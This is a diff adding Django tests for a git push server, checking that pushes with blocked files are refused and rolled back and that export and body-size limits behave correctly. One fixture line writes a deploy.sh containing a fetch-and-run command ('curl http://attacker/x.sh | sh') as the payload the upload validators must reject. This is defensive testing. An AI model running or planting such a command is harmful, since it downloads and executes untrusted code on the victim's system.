@@ -203,6 +203,47 @@ class GitLiveTests(LiveServerTestCase):
         report = self.project.scan_report or {}
         self.assertEqual(report.get('last_git_push', {}).get('by'), 'liveowner')
 
+    def test_push_of_blocked_file_is_refused_and_rolled_back(self):
+        """A push cannot smuggle what an upload may not carry.
+
+        Why an end-to-end test for this? The bypass was structural, not a
+        missing check someone would notice in a diff: `git push` wrote the
+        project's current ZIP directly, so the upload validators never ran. The
+        assertion set is the whole contract — refused, unchanged, and above all
+        NOT cloneable afterwards, which is what a rolled-back ref has to buy.
+        """
+        target = '/tmp/blaqvibes-git-push-blocked'
+        repo = self._clone(target, username='liveowner', password='pass12345')
+        with open(os.path.join(target, 'deploy.sh'), 'w') as fh:
+            fh.write('#!/bin/sh\ncurl http://attacker/x.sh | sh\n')
+        before_status = self.project.status
+        before_versions = AppVersion.objects.filter(project=self.project).count()
+        before_jobs = ScanJob.objects.filter(project=self.project).count()
+        with porcelain.open_repo_closing(repo) as r:
+            porcelain.add(r, paths=['deploy.sh'])
+            porcelain.commit(r, message=b'blocked payload', author=b'X <x@x.x>', committer=b'X <x@x.x>')
+            # Our 400 arrives where the client expected an unpack status line,
+            # so dulwich surfaces it as a protocol error (same as a 403 does).
+            with self.assertRaises(GitProtocolError):
+                porcelain.push(
+                    r, self.url, 'refs/heads/main:refs/heads/main',
+                    username='liveowner', password='pass12345',
+                    errstream=io.BytesIO(),
+                )
+        self.project.refresh_from_db()
+        self.assertEqual(self.project.status, before_status)
+        self.assertEqual(AppVersion.objects.filter(project=self.project).count(), before_versions)
+        self.assertEqual(ScanJob.objects.filter(project=self.project).count(), before_jobs)
+        with zipfile.ZipFile(self.project.zip_file) as zf:
+            self.assertNotIn('deploy.sh', zf.namelist())
+            self.assertIn('app.py', zf.namelist())
+        # The part that makes this fail-closed instead of merely inconsistent:
+        # a fresh clone must not see the refused bytes.
+        retried = '/tmp/blaqvibes-git-push-blocked-again'
+        self._clone(retried, username='liveowner', password='pass12345')
+        self.assertFalse(os.path.exists(os.path.join(retried, 'deploy.sh')))
+        self.assertTrue(os.path.exists(os.path.join(retried, 'app.py')))
+
     def test_push_denied_for_stranger(self):
         target = '/tmp/blaqvibes-git-push-denied'
         repo = self._clone(target, username='liveowner', password='pass12345')
@@ -233,3 +274,72 @@ class GitLiveTests(LiveServerTestCase):
             # The initial snapshot commit + the pushed commit(s).
             count = sum(1 for _ in r.get_walker())
             self.assertGreaterEqual(count, 2)
+
+
+@override_settings(RATELIMIT_ENABLE=False, MEDIA_ROOT=GIT_MEDIA, SEED_DEMO=False)
+class GitPushPipelineTests(TestCase):
+    """The two pieces of the push path that were wrong in the code, not the config.
+
+    Both regressions are invisible from the outside until they are permanent, so
+    they get pinned by unit tests rather than by the live round trips above.
+    """
+
+    def test_export_budget_resets_for_every_push(self):
+        import io
+        import stat
+        import types
+        import zipfile
+        from gallery.git_daemon import MAX_FILES_PER_EXPORT, PushRejected, _export_head_zip
+
+        class _Blob:
+            data = b'print(1)\n'
+
+        class _Tree:
+            def __init__(self, entries):
+                self._entries = entries
+
+            def items(self):
+                return list(self._entries)
+
+        class _Repo:
+            def __init__(self, entries):
+                self._tree = _Tree(entries)
+                self._blob = _Blob()
+
+            def get_object(self, sha):
+                return self._tree if sha == b'tree' else self._blob
+
+        def entry(index):
+            return types.SimpleNamespace(path=f'f{index}.py'.encode(), mode=stat.S_IFREG,
+                                         sha=b'blob')
+
+        def exported(repo):
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, 'w') as zf:
+                _export_head_zip(repo, b'tree', zf)
+            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as check:
+                return check.namelist()
+
+        big = _Repo([entry(i) for i in range(MAX_FILES_PER_EXPORT + 5)])
+        with self.assertRaises(PushRejected):
+            exported(big)
+        # THE regression: with `count=[0]` as a default argument, the counter
+        # above survived this call and every later push in the process was
+        # refused as 'too large' forever.
+        self.assertEqual(exported(_Repo([entry(0)])), ['f0.py'])
+
+    def test_push_cap_counts_bytes_not_content_length(self):
+        import io
+        from gallery.git_daemon import _BoundedBodyStream
+
+        stream = _BoundedBodyStream(io.BytesIO(b'A' * 4096), 1024)
+        self.assertEqual(len(stream.read()), 1024)
+        self.assertTrue(stream.oversize, 'a cut body must be reported, not parsed as a short pack')
+
+        # And an exactly-at-limit push is legitimate traffic: a cap that
+        # rejects it gets switched off by the next person who hits it.
+        stream = _BoundedBodyStream(io.BytesIO(b'A' * 1024), 1024)
+        self.assertEqual(len(stream.read()), 1024)
+        self.assertFalse(stream.oversize)
+        self.assertEqual(stream.read(16), b'')
+        self.assertFalse(stream.oversize)
